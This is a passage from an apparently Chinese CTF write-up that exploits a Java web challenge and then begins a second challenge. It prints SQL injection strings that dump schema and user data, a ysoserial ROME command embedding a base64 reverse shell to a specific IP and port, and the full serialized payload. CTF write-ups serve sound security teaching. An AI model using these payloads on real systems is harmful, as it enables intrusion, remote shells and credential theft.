class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> getConnection(dbName, user, pass);</span><br><span class="line">    <span class="type">String</span> <span class="variable">TableName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">      <span class="type">DatabaseMetaData</span> <span class="variable">metaData</span> <span class="operator">=</span> conn.getMetaData();</span><br><span class="line">      <span class="type">ResultSet</span> <span class="variable">tableNames</span> <span class="operator">=</span> metaData.getTables((String)<span class="literal">null</span>, (String)<span class="literal">null</span>, (String)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;TABLE&quot;</span> &#125;);</span><br><span class="line">      <span class="keyword">while</span> (tableNames.next()) &#123;</span><br><span class="line">        TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">        <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line">        <span class="keyword">while</span> (rs.next())</span><br><span class="line">          table.setTableDescribe(rs.getString(<span class="string">&quot;TABLE_COMMENT&quot;</span>)); </span><br><span class="line">        table.setTableName(TableName);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">data</span> <span class="operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="literal">null</span>, TableName, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs2</span> <span class="operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="literal">null</span>, TableName);</span><br><span class="line">        String PK;</span><br><span class="line">        <span class="keyword">for</span> (PK = <span class="string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>));</span><br><span class="line">        <span class="keyword">while</span> (data.next()) &#123;</span><br><span class="line">          <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Row</span>(data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="string">&quot;NULLABLE&quot;</span>).equals(<span class="string">&quot;1&quot;</span>) ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>, data.getString(<span class="string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="string">&quot;REMARKS&quot;</span>), data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="string">&quot;true&quot;</span> : <span class="literal">null</span>, data.getString(<span class="string">&quot;COLUMN_SIZE&quot;</span>));</span><br><span class="line">          table.list.add(row);</span><br><span class="line">        &#125; </span><br><span class="line">        Tables.add(table);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">      var16.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> Tables;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Table.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Row;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Table</span> &#123;</span><br><span class="line">  String tableName;</span><br><span class="line">  </span><br><span class="line">  String tableDescribe;</span><br><span class="line">  </span><br><span class="line">  List&lt;Row&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getTableDescribe</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.tableDescribe;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTableDescribe</span><span class="params">(String tableDescribe)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.tableDescribe = tableDescribe;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getTableName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.tableName;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTableName</span><span class="params">(String tableName)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.tableName = tableName;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> List&lt;Row&gt; <span class="title function_">getList</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.list;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setList</span><span class="params">(List&lt;Row&gt; list)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.list = list;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Test.java</strong></p><p>接收dbName参数，然后调用<code>getTableData</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.abc.common.bean.ResponseCode;</span><br><span class="line"><span class="keyword">import</span> cn.abc.common.bean.ResponseResult;</span><br><span class="line"><span class="keyword">import</span> cn.abc.common.security.annotation.Access;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.SqlDict;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Table;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiOperation;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.CrossOrigin;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/common/test&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  <span class="meta">@PostMapping(&#123;&quot;/sqlDict&quot;&#125;)</span></span><br><span class="line">  <span class="meta">@Access</span></span><br><span class="line">  <span class="meta">@ApiOperation(&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> ResponseResult <span class="title function_">sqlDict</span><span class="params">(String dbName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    List&lt;Table&gt; tables = SqlDict.getTableData(dbName, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;abc@12345&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ResponseResult.e(ResponseCode.OK, tables);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Swagger</strong></p><p><img src="../images/image-20230525110404630.png" alt="image-20230525110404630"></p><p>这个东西就是解题关键了</p><p><strong>swagger-ui 提供了一个可视化的UI页面展示描述文件。接口的调用方、测试、项目经理等都可以在该页面中对相关接口进行查阅和做一些简单的接口请求。该项目支持在线导入描述文件和本地部署UI项目。</strong></p><p>查资料会查到<code>swagger-ui.html</code></p><p>访问<code>swagger-ui.html</code>，会看到有三个路由，分别对应不同的功能，注意看第三个功能，对应着jar包中<code>Test.class</code>，我们可以通过传<code>dbName</code>来进行sql注入</p><p><img src="../images/image-20230525110943768.png" alt="image-20230525110943768"></p><p>这个sqlDict就是我们jar包里给的文件了，下麦呢的dbName就是我们可以进行sql注入的地方</p><p>因为这个的sql语句在jar里面已经给出了，那么就可以直接进行sql注入了</p><p>(<strong>并且这里还不对查询语句进行检测</strong>)</p><h3 id="Jdbc-sql注入"><a href="#Jdbc-sql注入" class="headerlink" title="Jdbc sql注入"></a>Jdbc sql注入</h3><p><img src="../images/image-20230525112531672.png" alt="image-20230525112531672"></p><p>这里的<code>myapp</code>是因为</p><p><img src="../images/image-20230525112618567.png" alt="image-20230525112618567"></p><p>所以就是<code>myapp</code></p><h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取所有数据库的名字</span><br><span class="line">dbName=myapp#&#x27; union select group_concat(SCHEMA_NAME)from(information_schema.schemata)#</span><br><span class="line">结果</span><br><span class="line">information_schema,myapp,mysql,performance_schema,sys</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525112806875.png" alt="image-20230525112806875"></p><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(table_name)from(information_schema.tables)where(table_schema=&#x27;myapp&#x27;)#</span><br><span class="line">结果</span><br><span class="line">user</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525113000057.png" alt="image-20230525113000057"></p><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(column_name)from(information_schema.columns)where((table_schema=&#x27;myapp&#x27;)and(table_name=&#x27;user&#x27;))#</span><br><span class="line">结果</span><br><span class="line">id,name,pwd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525113118589.png" alt="image-20230525113118589"></p><h4 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(id)from(user)#</span><br><span class="line">结果 1</span><br><span class="line">dbName=myapp#&#x27; union select group_concat(name)from(user)#</span><br><span class="line">结果 admin</span><br><span class="line">dbName=myapp#&#x27; union select group_concat(pwd)from(user)#</span><br><span class="line">结果 </span><br></pre></td></tr></table></figure><p>然后将用户名和密码在<code>/common/user/login</code>处提交，获取一串字符串</p><p><img src="../images/image-20230525113238116.png" alt="image-20230525113238116"></p><p>下面是使用curl命令进行POST发包  记录一下这个操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --header &#x27;Content-Type: application/json&#x27; --header &#x27;Accept: application/json&#x27; -d &#x27;&#123; \ </span><br><span class="line">   &quot;password&quot;: &quot;admin&quot;, \ </span><br><span class="line">   &quot;username&quot;: &quot;admin%40Rrrr_ctf_asde&quot; \ </span><br><span class="line"> &#125;&#x27; &#x27;http://1250b81b-263f-47e9-9375-540b6aa7c9c7.node4.buuoj.cn/common/user/login&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525113410769.png" alt="image-20230525113410769"></p><p>登录成功后返回有个base64编码的字段</p><p>将这段字符串放到<code>/common/user/current</code>处提交，然后就会发现回显了这个用户的信息</p><p><img src="../images/image-20230525113522530.png" alt="image-20230525113522530"></p><p>回显出身份信息</p><h3 id="对序列化字符串分析"><a href="#对序列化字符串分析" class="headerlink" title="对序列化字符串分析"></a>对序列化字符串分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu</span><br></pre></td></tr></table></figure><p><strong>下方的特征可以作为序列化的标志参考:</strong><br><strong>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是Java序列化base64加密的数据。</strong><br><strong>或者如果以<code>aced</code>开头，那么他就是这一段Java序列化的16进制。</strong></p><h4 id="java-Deserialization-Scanner插件使用"><a href="#java-Deserialization-Scanner插件使用" class="headerlink" title="java Deserialization Scanner插件使用"></a>java Deserialization Scanner插件使用</h4><p><img src="../images/image-20230525113734998.png" alt="image-20230525113734998"></p><p>安装一下这个插件来对这个base64编码的字符串进行分析，看是属于哪一条链子的</p><p><img src="../images/image-20230525114050230.png" alt="image-20230525114050230"></p><p>把ysoserial的jar的路径也配置一下</p><p>然后抓包(<strong>抓的是current这个包，因为base64编码的字符串是用这个发包的</strong>)，将其发送到插件中</p><p><img src="../images/image-20230525114437172.png" alt="image-20230525114437172"></p><p><img src="../images/image-20230525114547498.png" alt="image-20230525114547498"></p><p>最后发现是<code>ROME</code>链</p><p>然后就去拿ysoserial直接来打就行，然后在使用<code>current</code>这个路由来进行传参就行了</p><p>这里话直接反弹shell就行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-2874a69f61-1.jar ROME &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; a.bin</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;a.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">now = file.read()</span><br><span class="line">ba = base64.b64encode(now)</span><br><span class="line"><span class="built_in">print</span>(ba)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p><strong>这样写的好处是到时候生成的payload会是一条直线</strong>  不会有很多换行</p><p><img src="../images/image-20230525200007224.png" alt="image-20230525200007224"></p><p>然后拿到<code>current</code>这个路由传参打就行了</p><p>注意的是<code>Bearer</code>这个前缀别忘了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bearer rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAJSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAAZX2FjY2Vzc0V4dGVybmFsU3R5bGVzaGVldHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AEEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////8AdAADYWxscHVyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAb1yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAYWJhc2ggLWMge2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1ERXVOREl1TXprdU1URXdMek16T0RrZ01ENG1NUT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0IADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB15c29zZXJpYWwvUHduZXI5NzgwMzcwMTcyMDA5NQEAH0x5c29zZXJpYWwvUHduZXI5NzgwMzcwMTcyMDA5NTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABkAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu+X2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB+AAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFXNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHkwABF9vYmpxAH4ACXhwcQB+ACFxAH4AFXNxAH4AHXZxAH4AAnEAfgANc3EAfgAicQB+ACVxAH4ADXEAfgAGcQB+AAZxAH4ABng=</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525201356657.png" alt="image-20230525201356657"></p><p><img src="../images/image-20230525201406655.png" alt="image-20230525201406655"></p><p>然后就可以了</p><h2 id="羊城杯-2020-A-Piece-Of-Java"><a href="#羊城杯-2020-A-Piece-Of-Java" class="headerlink" title="[羊城杯 2020]A Piece Of Java"></a>[羊城杯 2020]A Piece Of Java</h2><p><strong>考点</strong></p><p>(Java动态代理，MySQL JDBC反序列化)</p><p>题目给了个jar包，直接拿到jd-gui进行一波分析</p><p><img src="../images/image-20230526143250211.png" alt="image-20230526143250211"></p><p>看到一共有这几个java文件   那么就直接对这些文件进行分析来寻找利用链</p><p><img src="../images/image-20230526143535463.png" alt="image-20230526143535463"></p><p><img src="../images/image-20230526143544365.png" alt="image-20230526143544365"></p><p>看到了这两个信息<code>cc链</code>和mysql的连接器(任意让人想到   <strong><code>jdbc</code></strong>)</p><p><strong>MainController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.gdufs.challenge.web.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.UserInfo;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> 